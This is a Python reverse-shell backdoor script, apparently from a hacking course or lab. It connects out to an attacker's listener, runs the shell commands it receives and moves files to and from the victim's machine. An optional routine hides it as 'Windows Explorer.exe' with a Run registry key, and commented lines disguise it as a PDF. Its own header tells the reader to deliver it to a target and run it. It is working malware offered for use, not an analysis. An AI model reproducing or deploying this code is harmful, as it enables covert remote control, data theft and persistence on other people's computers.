#reverse backdoor
#start listener in your system and deliver this file to target system and run this file.

#!/usr/bin/python

import socket
import subprocess, json, os, base64, sys
import shutil

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        #Only call become_persistent() if persistence is needed. During testing, you might want to comment it out to avoid bloating the registry.
        #self.become_persistent()

    def become_persistent(self):
        #run if backdoor is on windows
        if os.name == "nt":
            evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
    # stderr=DEVNULL, stdin=DEVNULL for packaging as binary and no console should show.

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successfull."

    def read_file(self, path):
        with open(path, "rb") as file:        #read - r binary -b
            return base64.b64encode(file.read())


    def run(self):
        while True:

            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd":
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                            # upload0 abc.txt1 content2
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"

            self.reliable_send(command_result)

        self.connection.close()


#Optional: execute a PDF file if bundled
#uncomment below 2 commands when packaging with pyinstaller for bytecodes

# file_name = sys._MEIPASS + "\sample.pdf"
# subprocess.Popen(file_name, shell=True)


try:
    my_backdoor = Backdoor("10.0.2.16", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
